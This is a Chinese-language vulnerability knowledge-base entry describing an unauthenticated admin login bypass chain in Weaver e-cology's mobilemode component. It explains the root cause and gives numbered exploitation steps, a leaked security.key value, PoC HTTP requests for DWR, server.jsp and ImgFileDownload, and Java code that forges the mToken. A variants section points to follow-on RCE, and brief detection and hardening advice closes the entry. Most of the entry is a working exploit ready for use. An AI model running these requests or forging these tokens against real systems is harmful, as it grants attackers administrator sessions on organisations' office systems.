---
id: web-generic-auth-weaver-ecology-mobilemode-token-chain-login-bypass
title: 泛微 e-cology 前台登录绕过：DWR 读取 security.key + AES 伪造 mToken + ImgFileDownload 换取 ecology_JSessionid
type: scenario
domain: web
path: web/generic/auth
technique: weaver-ecology-mobilemode-token-chain-login-bypass
aliases:
- 泛微前台登录绕过
- e-cology 登录绕过
- security.key 泄露
- mToken 伪造
- sessionKey 换取 ecology_JSessionid
- mobilemode 登录链
tags:
- web
- java
- weaver
- ecology
- auth-bypass
- token-forgery
- dwr
- aes
- mobilemode
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V223
  verified_at: '2026-11-07T06:26:51+08:00'
  notes: 已对照原文32张图逐张核对（缺02/11/26/28与meta一致）：DWR PlainCallHandler→DefaultRemoter→BaseBean.LoadTemplateProp(mobilemode) 读到 WEB-INF/prop/mobilemode.properties 的 security.key=005f7540-f120-41、AES/SHA1PRNG 种子加密1;1;时间戳伪造mToken、MobileEntranceAction.getAppMeta/getTokenKey 换 sessionKey、ImgFileDownload 取 sessionkey 调 AuthService.getCurrUser 写入 weaver_user@bean 并落地 ecology_JSessionid、最终系统管理员门户截图均一致。未验证点：PoC未本机复跑；原文未标注具体版本（e-cology 9 为环境），未设affected_versions；frontmatter无 sources/source_url。
---

## 一句话结论

泛微 e-cology 的未授权 DWR 接口 `PlainCallHandler` 可反射调用 `WorkflowSubwfSetUtil.LoadTemplateProp("mobilemode")` 读取 `WEB-INF/prop/mobilemode.properties` 中的 `security.key`；攻击者用该 key 作为 AES/SHA1PRNG 种子加密 `1;1;<时间戳>` 伪造 `mToken`，经 `mobilemode/mobile/server.jsp` 的 `MobileEntranceAction.action=meta` 换取 `sessionKey`，再请求 `/weaver/ImgFileDownload/a.swf?sessionkey=...` 让服务端把用户写入会话并下发 `ecology_JSessionid`，从而未登录获得管理员会话。

## 原理

- **第一步：读 security.key**。`/dwr/call/plaincall/` 由 `DWRServlet` → `UrlProcessor` 匹配到 `PlainCallHandler`，后者把请求参数封装成 `Call` 交给 `DefaultRemoter.execute`，按 `scriptName`/`methodName` 反射调用 `WorkflowSubwfSetUtil.LoadTemplateProp(String)`。该方法继承自 `BaseBean`，按传入的 `mobilemode` 读取 `WEB-INF/prop/mobilemode.properties`；响应把 properties 返回，其中含 `security.key=005f7540-f120-41`。
- **第二步：伪造 mToken**。移动端登录 token 的算法是 `AES` + `SecureRandom("SHA1PRNG")`，以 `security.key` 的字节作为种子生成 128 位密钥，加密明文 `"1;1;" + 当前毫秒`，输出十六进制串即 `mToken`。该算法在客户端/公开代码中可还原，key 泄露后可离线批量生成。
- **第三步：换取 sessionKey**。`/mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta...&mToken=...`：server.jsp 对 `invoker` 做 `Class.forName`，要求类继承 `BaseMobileAction` 后实例化并 `execute_proxy()`；`MobileEntranceAction` 的 `@ActionMapping(name="meta") getAppMeta()` 在 `user == null` 时调用 `getTokenKey()`，校验 mToken 后返回 `{"sessionKey": "..."}`。
- **第四步：换成会话**。`/weaver/ImgFileDownload/a.swf?sessionkey=<sessionKey>` 的 `ImgFileDownload.doGet` 在 `HrmUserVarify.getUser` 返回 null 时，从 query string 取 `sessionkey`，调用 `AuthService.getCurrUser(sessionkey)`；查到用户后把 `weaver_user@bean` 写入 session，响应即可下发/关联 `ecology_JSessionid`。
- **根因**：`security.key` 作为移动端 token 的对称密钥被未授权的 DWR 反射接口读出；token 只包含 `1;1;时间戳`，不绑定设备/用户，且 `sessionKey` 可被任意请求兑换为正式会话。四个组件各自看似正常，串起来构成完整的前台→管理员登录绕过。

## 触发条件

- 目标为使用 mobilemode 组件的泛微 e-cology（文章称“某微”，路径含 `/weaver/`、`ecology_JSessionid`、`WEB-INF/prop`，未标注具体版本）。
- `/dwr/call/plaincall/` 可未授权访问，且 DWR 允许调用 `WorkflowSubwfSetUtil.LoadTemplateProp`。
- 目标存在 `mobilemode/mobile/server.jsp` 与 `MobileEntranceAction`，`ImgFileDownload` servlet 可用。
- 攻击者能访问上述接口，且 `security.key` 对应的 AES 算法/种子规则可还原（文章给出完整 Java 实现）。

## 利用步骤

1. 请求 DWR plaincall 读取 `mobilemode` 属性：
   `POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf`
2. 从响应/属性内容中取出 `security.key`（原文为 `005f7540-f120-41`）。
3. 用 AES/SHA1PRNG(seed=security.key) 加密明文 `"1;1;" + System.currentTimeMillis()`，得到十六进制 `mToken`。
4. 请求 `server.jsp` 的 `MobileEntranceAction&action=meta`，携带 `mToken`、`mTokenFrom=QRCode`、`appid=1`、`appHomepageId=1`、`_ec_ismobile=true`，从 JSON 响应取 `sessionKey`。
5. 请求 `/weaver/ImgFileDownload/a.swf?sessionkey=<sessionKey>`，拿到 `ecology_JSessionid`。
6. 将 `ecology_JSessionid` 写入浏览器 Cookie，刷新即可进入系统（原文截图为“系统管理员”门户）。

## PoC

第一步读取 security.key：

```http
POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
```

第三步生成 mToken（原文 Java）：

```java
public static String encrypt(String str, String str2) throws Exception {
    KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
    SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");
    secureRandom.setSeed(str2.getBytes());
    keyGenerator.init(128, secureRandom);
    SecretKeySpec keySpec = new SecretKeySpec(keyGenerator.generateKey().getEncoded(), "AES");
    Cipher cipher = Cipher.getInstance("AES");
    cipher.init(Cipher.ENCRYPT_MODE, keySpec);
    return DatatypeConverter.printHexBinary(cipher.doFinal(str.getBytes()));
}
// encrypt("1;1;" + System.currentTimeMillis(), "005f7540-f120-41")
```

第四步换取 sessionKey：

```http
GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=<mToken>&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1
Host: <target>
```

第五步换取会话：

```http
GET /weaver/ImgFileDownload/a.swf?sessionkey=<sessionKey>&a=.swf HTTP/1.1
Host: <target>
```

原文截图确认最终进入系统管理员门户；未给出每一步的完整响应体。

## 变体与关联

- 变体：若 `security.key` 已泄露/公开（产品默认值、备份、源码），可跳过 DWR 步骤直接伪造 mToken。
- 变体：`sessionkey` 也可从其他泄露渠道获取；`ImgFileDownload` 的兑换逻辑是通用会话落地器。
- 关联：登录后台后衔接 `outter_encryptclassOperation.jsp` 的 MVEL ShellSession 反射执行与 RASP 绕过写 JSP。
- 同类：泛微 E10 `/sapi/bs/**` 通配鉴权绕过、E9 LoginAdminFilter/JSESSIONID 绕过等（不同组件与机制）。

## 检测与防御

- 修复：DWR 只暴露必要方法并做白名单，禁止反射调用 `LoadTemplateProp` 等读取配置的方法；移动端 token 改为服务端签发、签名且绑定用户/设备；`ImgFileDownload` 的 sessionkey 兑换应限制来源与用途。
- 检测：未登录访问 `/dwr/call/plaincall/` 且 `scriptName` 为 `WorkflowSubwfSetUtil`；短时间内 `server.jsp` 生成 mToken/sessionKey 后紧跟 `ImgFileDownload` 请求；同一 `ecology_JSessionid` 从异常 IP 登录。
- 加固：升级/打补丁；移除或限制 mobilemode 组件；`security.key` 改为随机值并定期轮换；DWR 接口加认证与访问控制。
